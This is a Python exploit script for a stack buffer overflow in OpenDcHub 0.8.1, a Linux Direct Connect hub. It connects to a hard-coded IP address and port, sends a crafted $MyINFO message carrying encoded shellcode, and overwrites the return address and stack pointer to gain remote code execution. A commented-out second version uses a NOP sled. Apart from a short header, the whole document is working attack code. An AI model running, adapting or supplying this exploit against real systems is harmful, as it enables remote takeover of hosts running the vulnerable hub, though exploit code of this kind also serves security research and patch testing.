#!/usr/bin/python
#
# OpenDcHub 0.8.1 Remote Code Execution Exploit
# Pierre Nogues - http://www.indahax.com
#
# Description:
#     OpenDcHub is a direct connect hub for Linux
#
#     OpenDcHub doesn't handle specially crafted MyINFO message which lead to a stack overflow.
#
# Affected versions :
#     OpenDcHub 0.8.1
#
# Plateforms :
#     Unix
#
# Usage :
#     ./exploit.py
 
import socket
 
host = '192.168.1.9'
port = 5000
 
# must not contain \x36 \x53 \x00 bytes
# max shellcode size = 103 bytes use exploit v2 otherwise
shellcode="\x33\xc9\xb1\x13\xba\xf6\x1d\xe7\xfa\xdb\xde\xd9\x74\x24"
shellcode+="\xf4\x5e\x83\xc6\x04\x31\x56\x0a\x03\xa0\x17\x05\x0f\x7d"
shellcode+="\xf3\x3e\x13\x2e\x40\x92\xbe\xd2\xcf\xf5\x8f\xb4\x02\x75"
shellcode+="\xb4\x66\xf5\xb6\xe3\x97\x37\x51\x9c\x86\x6b\xfb\x0f\xc2"
shellcode+="\x83\x52\xe0\x9b\x45\x17\x6a\xfd\xdd\x55\xea\x58\x59\xbc"
shellcode+="\x5b\x65\xa8\xbf\xd5\xe0\xcb\x90\x8d\x3d\x03\x62\x26\x29"
shellcode+="\x74\xe6\xdf\xc7\x03\x05\x4f\x44\x9d\x2b\xc0\x61\x50\x2b"
shellcode+="\x2b"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send("$ValidateNick joseph|")
 
hax="$MyINFO $ALL joseph "
hax+=shellcode
for i in range(103 - len(shellcode)):
     hax+="A"
hax+="$"
hax+="\x20\x81\x81\x80" # esp
hax+="\xed\xf6\xfe\xbf" # eip
hax+="S:-1|"
 
s.send(hax)
s.close()
 
"""
# V2
# more complex version working too, it have more space for the shellcode
 
hax="$MyINFO $ALL joseph AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
hax+="\xFF\xFF\xFF\xFE" # local var int len of commands.c:my_info() must be a negative value
hax+="TTTTUUUUVVVVWWWWXXXXYYYYZZZZBBBBCCCCEEEEEEE$"
hax+="\x20\x81\x81\x80" # esp
hax+="\x80\xf7\xfe\xbf" # eip
hax+="\xCC\xCC\xCC\xCC" # useless var
hax+="\x10\xf0\xfe\xbf" # this address + x20 will be overwritten by 4 bytes
# shellcode time
hax+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
hax+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
hax+=shellcode
hax+="|"
"""